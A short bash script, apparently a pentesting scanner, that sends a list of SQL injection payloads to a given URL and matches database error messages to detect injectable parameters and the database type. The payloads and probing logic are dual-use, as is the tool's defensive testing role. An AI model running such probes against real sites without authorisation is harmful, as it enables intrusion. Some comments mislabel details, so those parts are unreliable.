#!/bin/bash

# SQLi Scanner - Detects In-band SQL Injection (Error-Based & Union-Based) and SQL Server Type
# Usage: ./sqli_scanner.sh http://example.com/page.php?id=1

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <target URL>"
    exit 1
fi

TARGET="$1"

# List of SQLi test payloads
SQL_PAYLOADS=(
    "'" "\""
    "'-- -" "\"-- -"
    "'#" "\"#"
    "' OR '1'='1" "\" OR \"1\"=\"1"
    "' UNION SELECT 1,2,3-- -" "\" UNION SELECT 1,2,3-- -"
)

# Common SQL error messages to look for
ERROR_PATTERNS=(
    "You have an error in your SQL syntax"          # MySQL
    "Unclosed quotation mark after the character string"   # MSSQL
    "Warning: mysql_fetch"                         # MySQL
    "SQL command not properly ended"               # MSSQL
    "PostgreSQL.*ERROR"                            # PostgreSQL
    "syntax error at or near"                      # PostgreSQL
    "Warning.*mysqli"                              # MySQL
    "Supplied argument is not a valid MySQL result resource" # MySQL
    "Microsoft OLE DB Provider for SQL Server"     # MSSQL
)

# Function to get the server header from the response
get_server_info() {
    SERVER_INFO=$(curl -sI "$TARGET" | grep -i "Server:")
    if [ -z "$SERVER_INFO" ]; then
        echo "Server information not found."
    else
        echo "Server Info: $SERVER_INFO"
    fi
}

# Function to detect SQL server based on error patterns
detect_sql_server() {
    RESPONSE=$(curl -s "$TARGET"'"') # Injecting single quote to check for SQL errors
    if echo "$RESPONSE" | grep -qi "You have an error in your SQL syntax"; then
        echo "Detected SQL Server: MySQL"
    elif echo "$RESPONSE" | grep -qi "Unclosed quotation mark after the character string"; then
        echo "Detected SQL Server: MSSQL"
    elif echo "$RESPONSE" | grep -qi "syntax error at or near"; then
        echo "Detected SQL Server: PostgreSQL"
    else
        echo "SQL Server could not be identified."
    fi
}

echo "Scanning target: $TARGET"
echo "Fetching server info..."

# Display target server information
get_server_info

echo "Detecting SQL server type..."
# Detect the type of SQL server being used
detect_sql_server

for PAYLOAD in "${SQL_PAYLOADS[@]}"; do
    URL="${TARGET}${PAYLOAD}"
    echo "[*] Testing: $URL"

    RESPONSE=$(curl -s "$URL")

    for ERROR in "${ERROR_PATTERNS[@]}"; do
        if echo "$RESPONSE" | grep -qi "$ERROR"; then
            echo "[+] Potential SQL Injection Found! Payload: $PAYLOAD"
            echo "    Detected Error: $ERROR"
            exit 0
        fi
    done
done

echo "[-] No SQL Injection vulnerability detected."
exit 1
